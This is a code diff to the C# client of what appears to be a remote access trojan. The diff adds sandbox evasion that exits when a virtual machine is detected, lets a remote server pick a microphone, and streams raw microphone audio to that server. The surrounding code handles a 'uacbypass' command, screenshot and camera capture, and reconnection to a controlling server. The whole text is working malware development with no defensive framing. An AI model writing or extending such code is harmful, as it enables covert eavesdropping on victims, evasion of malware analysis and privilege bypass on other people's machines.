@@ -19,6 +19,7 @@ namespace Client
         public static JObject config = GClass.config();
         public static int monitoridx = 0;
         public static int cameraidx = 0;
+        public static int micidx = 0; // ✅ Added micidx
 
         private static CancellationTokenSource screenshotTokenSource;
         private static Task screenshotLoopTask;
@@ -47,7 +48,17 @@ namespace Client
 
         static async Task RunClientAsync()
         {
-            GClass.ShowCmd(GClass.IsTrue("debug"));
+            if (GClass.IsTrue("antivm"))
+            {
+                var res = VirtualizationDetection.VMDetector.Detect();
+                Console.WriteLine(res.ToString());
+                if (res != VirtualizationDetection.VmType.None)
+                {
+                    Application.Exit();
+                }
+                ;
+                Console.WriteLine("we're continuing");
+            }
 
             var client = new LazyServerClient();
             await GClass.ReconnectLoop(client);
@@ -139,6 +150,10 @@ namespace Client
                             cameraidx = (int)message["idx"];
                             break;
 
+                        case "mic": // ✅ New case for mic index
+                            micidx = (int)message["idx"];
+                            break;
+
                         case "uacbypass":
                             isGracefulDisconnect = true;
                             client.Disconnect();
@@ -172,7 +187,7 @@ namespace Client
                 }
                 catch
                 {
-                    // optional error handling
+                    // Optional: handle errors
                 }
             };
         }
@@ -354,31 +369,35 @@ namespace Client
             micTokenSource = new CancellationTokenSource();
             var token = micTokenSource.Token;
 
+            int deviceCount = WaveIn.DeviceCount;
+
+            if (deviceCount == 0 || micidx >= deviceCount)
+                return;
+
             waveIn = new WaveInEvent
             {
+                DeviceNumber = micidx,
                 WaveFormat = new WaveFormat(8000, 16, 1),
-                BufferMilliseconds = 50       // ~400 samples per buffer
+                BufferMilliseconds = 50
             };
 
             waveIn.DataAvailable += (s, e) =>
             {
                 if (token.IsCancellationRequested) return;
 
-                // Copy out only the recorded bytes
                 var pcm = new byte[e.BytesRecorded];
                 Array.Copy(e.Buffer, 0, pcm, 0, e.BytesRecorded);
 
-                // Send raw PCM — no WaveFileWriter, no header
                 _ = client.SendFileBytesWithMeta(pcm, new JObject
                 {
-                    ["msg"] = "micaudio"
+                    ["msg"] = "micaudio",
+                    ["microphones"] = deviceCount // ✅ Send mic count
                 }.ToString());
             };
 
             waveIn.StartRecording();
             micLoopRunning = true;
 
-            // Keep the Task alive until cancellation
             micLoopTask = Task.Run(async () =>
             {
                 try
@@ -394,9 +413,6 @@ namespace Client
                 }
             }, token);
         }
-
-
-
 
         static async Task StopMicLoopAsync()
         {
